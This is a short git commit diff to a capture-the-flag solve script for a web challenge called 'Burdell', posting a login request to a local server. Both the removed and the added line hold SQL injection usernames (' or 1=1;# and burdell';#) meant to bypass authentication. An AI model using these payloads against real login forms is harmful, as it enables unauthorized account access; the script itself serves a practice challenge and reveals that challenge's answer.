64b5aa26a5f0d696a39a46fa250b1c58c2fff0dc
Dennis Li <23002167+dli357@users.noreply.github.com>
2018-10-19 04:34:27 -0400

    Added logos and fixed burdell solution

--- 2018/web/Burdell/solve.py
+++ 2018/web/Burdell/solve.py
@@ -6,7 +6,7 @@ cookies = []
 url = 'http://127.0.0.1:9001'
 
 
-payload = {'username': '\' or 1=1;#', 'password':'asdf'}
+payload = {'username': 'burdell\';#', 'password':'asdf'}
 r = sess.post(url, data=payload)
 print(r.text)
 
